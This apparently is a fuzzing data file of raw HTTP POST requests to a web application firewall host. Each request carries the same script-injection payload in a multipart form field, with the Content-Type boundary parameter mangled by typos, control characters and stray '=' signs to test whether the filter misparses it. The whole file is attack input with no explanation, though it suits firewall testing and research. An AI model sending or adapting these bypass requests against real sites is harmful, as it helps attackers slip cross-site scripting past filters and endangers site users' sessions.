POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 610\r\nContent-Type: multipart/form-data; bonaryboundaryounary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 674\r\nContent-Type: multipart/form-data; bo+ndaybounary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 738\r\nContent-Type: multipart/form-data; =boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 802\r\nContent-Type: multipart/form-data; boun/ry==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 866\r\nContent-Type: multipart/form-data; boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 930\r\nContent-Type: multipart/form-data; bUou\\nary=====;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 994\r\nContent-Type: multipart/form-data; bondary=bounda|ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 40\r\nContent-Type: multipart/form-data; boundjarboundaryboundry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 104\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 168\r\nContent-Type: multipart/form-data; boundary=bo\x1cndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 232\r\nContent-Type: multipart/form-data; =beundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 296\r\nContent-Type: multipart/form-data; Poundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 360\r\nContent-Type: multipart/form-data; undary=boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 424\r\nContent-Type: multipart/form-data; =boun6aRr;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 488\r\nContent-Type: multipart/form-data; boundary=boundCary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 552\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 616\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 680\r\nContent-Type: multipart/form-data; bogundry=boundarybundar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 744\r\nContent-Type: multipart/form-data; =bjoundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 808\r\nContent-Type: multipart/form-data; bV8ndary=boundary=bo\x01ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 872\r\nContent-Type: multipart/form-data; oundaPboendary=boundarybmounday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 936\r\nContent-Type: multipart/form-data; Oboundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 56\r\nContent-Type: multipart/form-data; ==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 120\r\nContent-Type: multipart/form-data; budgaryboundaky==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 184\r\nContent-Type: multipart/form-data; \x10o\x1ddary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 248\r\nContent-Type: multipart/form-data; b#undarVb)undar/[y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 312\r\nContent-Type: multipart/form-data; boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 376\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 440\r\nContent-Type: multipart/form-data; boundaryboundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 504\r\nContent-Type: multipart/form-data; =`on\rday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 568\r\nContent-Type: multipart/form-data; boundaryboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 632\r\nContent-Type: multipart/form-data; boundaqNrybundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 696\r\nContent-Type: multipart/form-data; boundary=boundaryboundamy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 760\r\nContent-Type: multipart/form-data; boundaryboundary=boundar:;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 824\r\nContent-Type: multipart/form-data; \x08oundaryboundry=bihund\x12sy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 888\r\nContent-Type: multipart/form-data; boundar1=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 952\r\nContent-Type: multipart/form-data; boundary=boudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 63\r\nContent-Type: multipart/form-data; bo_aryboundaryboundaQy\x1cboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 127\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 191\r\nContent-Type: multipart/form-data; boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 255\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 319\r\nContent-Type: multipart/form-data; boundary=boucdaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 383\r\nContent-Type: multipart/form-data; boundarybou\x18ndaryboundaJy=ou=\\dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 447\r\nContent-Type: multipart/form-data; wbou\x1edaryboundary=boundaM;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 511\r\nContent-Type: multipart/form-data; boudary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 575\r\nContent-Type: multipart/form-data; boun]daryboundaryvbounday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 639\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 703\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 767\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 831\r\nContent-Type: multipart/form-data; bo\x03undary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 895\r\nContent-Type: multipart/form-data; \roundar=bound{yboundaryboundarybounqar);\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 959\r\nContent-Type: multipart/form-data; \x17QbndrGboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 36\r\nContent-Type: multipart/form-data; boundaybound`\x15ary=bIundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 100\r\nContent-Type: multipart/form-data; boZndary=bDundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 164\r\nContent-Type: multipart/form-data; boundary=bounary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 228\r\nContent-Type: multipart/form-data; ==boun*a`ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 292\r\nContent-Type: multipart/form-data; boundry=boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 356\r\nContent-Type: multipart/form-data; bu\x14nHa\x18y=boiundaN;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 420\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 484\r\nContent-Type: multipart/form-data; ===;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 548\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 612\r\nContent-Type: multipart/form-data; boundgry=boundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 676\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 740\r\nContent-Type: multipart/form-data; bounVdaryou\x14ndaryboundar1y-oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 804\r\nContent-Type: multipart/form-data; ==Lbundjr;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 868\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 932\r\nContent-Type: multipart/form-data; bondaryboundaryounjdaryboundar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 996\r\nContent-Type: multipart/form-data; b\x0cXuqa-y=boAgdary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 21\r\nContent-Type: multipart/form-data; boun=daryboundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 85\r\nContent-Type: multipart/form-data; boundaryb)unday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 149\r\nContent-Type: multipart/form-data; =boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 213\r\nContent-Type: multipart/form-data; oundary==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 277\r\nContent-Type: multipart/form-data; =boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 341\r\nContent-Type: multipart/form-data; bouk~arTy=$#oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 405\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 469\r\nContent-Type: multipart/form-data; =;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 533\r\nContent-Type: multipart/form-data; =boundary==b\x1aundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 597\r\nContent-Type: multipart/form-data; =boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 661\r\nContent-Type: multipart/form-data; bundary=bound\x1cary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 725\r\nContent-Type: multipart/form-data; boundry=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 789\r\nContent-Type: multipart/form-data; boun{ary=bounday;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 853\r\nContent-Type: multipart/form-data; bOoundarybo nd+ary=bundairy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 917\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 981\r\nContent-Type: multipart/form-data; boundarybo}und;ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 33\r\nContent-Type: multipart/form-data; _oundarybo}\x0fuvx{ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 97\r\nContent-Type: multipart/form-data; bounduary=bound\x03ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 161\r\nContent-Type: multipart/form-data; boundary==boundarybLounv\x13rZyboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 225\r\nContent-Type: multipart/form-data; bounAdary=boundarybo|undary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 289\r\nContent-Type: multipart/form-data; b\x7foundaryboundary=boundar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 353\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 417\r\nContent-Type: multipart/form-data; boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 481\r\nContent-Type: multipart/form-data; =boundaNy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 545\r\nContent-Type: multipart/form-data; boundary\x1dboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 609\r\nContent-Type: multipart/form-data; bounma\x18yboundry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 673\r\nContent-Type: multipart/form-data; boundaryo\x03\x12darH=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
